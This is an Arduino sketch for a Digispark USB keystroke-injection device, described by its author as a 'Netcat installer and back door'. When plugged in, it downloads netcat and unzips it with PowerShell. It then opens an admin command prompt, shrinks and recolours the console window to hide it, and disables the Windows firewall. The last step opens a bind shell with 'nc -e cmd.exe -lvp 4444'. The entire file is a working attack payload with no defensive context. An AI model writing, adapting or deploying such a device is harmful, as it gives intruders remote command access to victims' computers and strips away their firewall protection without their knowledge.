#include "DigiKeyboard.h"

void setup() {
 //Creator: Flaviu
 //Netcat installer and back door
 //Needs some impruvements(it's slow)
}


void loop() {
  
DigiKeyboard.delay(500);//Recognition Delay


DigiKeyboard.sendKeyStroke(0);//Recognition


DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Start download
DigiKeyboard.delay(1000);
DigiKeyboard.print("https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5000);  //Delay for download(change in case of better or lower petformace)
DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);//Finish download and close browser

 
DigiKeyboard.delay(1000);


DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Open run
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");//Not admin
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(1000);


DigiKeyboard.print("mode con:cols=18 lines=1");//Change aspect
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("color EF");
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(1000);


DigiKeyboard.print("cd Downloads");//Go to downloads
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("powershell");//Open powershell on downloads
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(3000);


DigiKeyboard.print("Expand-Archive netcat-win32-1.12.zip -DestinationPath C:/netcat");//Unzip file
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(5000);


DigiKeyboard.print("exit");//Exit powershell
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(300);


DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);//Close cmd
DigiKeyboard.delay(2000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Open cmd admin mode
DigiKeyboard.delay(1000);
DigiKeyboard.print("cmd");
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT| MOD_CONTROL_LEFT); 
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(1000);


DigiKeyboard.print("mode con:cols=18 lines=1");//Change aspect
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("color EF");
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.delay(1000);


DigiKeyboard.print("cd c:/");//Go to netcat path
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("cd netcat");
DigiKeyboard.sendKeyStroke(KEY_ENTER);


DigiKeyboard.print("netsh firewall set opmode disable");//Disable firewall
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);


DigiKeyboard.print("nc -e cmd.exe -lvp 4444");//Start listener on a port
DigiKeyboard.sendKeyStroke(KEY_ENTER);








while (true)
{
    digitalWrite(1, HIGH);
    delay(1000);
    digitalWrite(1, LOW);
    delay(1000);
}

}
